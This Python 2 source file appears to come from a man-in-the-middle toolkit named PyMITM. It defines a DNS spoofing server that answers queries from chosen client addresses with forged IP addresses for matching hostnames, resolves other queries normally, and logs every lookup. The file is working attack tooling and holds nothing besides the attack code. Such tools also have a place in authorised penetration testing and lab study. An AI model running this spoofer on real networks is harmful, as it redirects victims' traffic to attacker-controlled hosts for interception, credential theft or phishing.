#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2014-07-07
# @Author  : Robin (sintrb@gmail.com)
# @Link    : https://github.com/sintrb/PyMITM/
# @Version : 1.0

from PyHTTPProxy import HttpProxyHandler, HttpProxyServer
from PyDNSServer import DNSQueryHandler, DNSServer
from util import match

class DNSSpoofingHandler(DNSQueryHandler):
	def spoofing(self, hostname, dns, rawdata, sock):
		fromip = self.client_address[0]
		for ipp,rev in self.server.resolv:
			if match(ipp, fromip):
				for hnp,ip in rev:
					if match(hnp, hostname):
						return ip
				return self.queryip(hostname)
		return self.queryip(hostname)
	def when_query(self, hostname, dns, rawdata, sock):
		ip = self.spoofing(hostname, dns, rawdata, sock)
		l = '%s %s %s'%(self.client_address[0], hostname, ip)
		self.server.log(l)
		return ip

class DNSSpoofingServer(DNSServer):
	def log(self, l):
		if self.log_file:
			self.log_file.write(l)
			self.log_file.write("\n")
			self.log_file.flush()
		if self.log_console:
			print l
	def __init__(self, setting):
		self.setting = setting
		self.resolv = self.setting['resolv']
		self.logging = self.setting['logging']

		self.log_console = not ('console' in self.logging and not self.logging['console'])
		self.log_file = 'file' in self.logging and open(self.logging['file'], 'a+')
		host = setting['listen']['host']
		port = setting['listen']['port']
		print 'DNS Server running at %s:%s'%(host, port)
		DNSServer.__init__(self,server_address=(host, port),DNSQueryHandlerClass=DNSSpoofingHandler)

